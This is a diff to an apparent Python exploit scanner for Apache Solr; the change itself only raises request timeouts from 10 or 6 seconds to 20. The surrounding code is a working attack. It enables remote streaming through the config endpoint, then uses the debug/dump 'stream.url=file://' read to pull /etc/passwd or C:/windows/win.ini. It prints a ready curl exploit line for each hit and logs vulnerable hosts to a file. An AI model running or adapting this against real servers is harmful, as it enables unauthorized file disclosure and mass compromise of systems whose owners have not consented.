@@ -39,20 +39,20 @@ def exp(url):
             aUrl = '{}/solr/{}/config'.format(url,dbName)
             bUrl = '{}/solr/{}/debug/dump?param=ContentStreams'.format(url,dbName)
 
-            x = requests.post(aUrl,headers=aHeader,data=aPost,verify=False,timeout=10)
+            x = requests.post(aUrl,headers=aHeader,data=aPost,verify=False,timeout=20)
 
             if '关于全网部署360私有云的通知' in x.text:
                 return False
 
             if x.status_code==200:
 
-                x = requests.post(bUrl,headers=bHeader,data=bPost,verify=False,timeout=10)
+                x = requests.post(bUrl,headers=bHeader,data=bPost,verify=False,timeout=20)
                 if 'root:x:0:0:' in x.text:
                     exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                     print("[+ !vul -- {} --".format(exp))
                     f.write(line+"\n")
                     return True
-                x = requests.post(bUrl,headers=bHeader,data=cPost,verify=False,timeout=10)
+                x = requests.post(bUrl,headers=bHeader,data=cPost,verify=False,timeout=20)
                 if 'extensions' in x.text:
                     exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                     print("[+ !vul -- {} --".format(exp))
@@ -66,7 +66,7 @@ def getDb(url):
 
     try:
         url = url + '/solr/admin/cores?action=STATUS'
-        response = requests.get(url,verify=False,timeout=6)
+        response = requests.get(url,verify=False,timeout=20)
         data = response.text
         try:
             r = re.compile('''"status":{
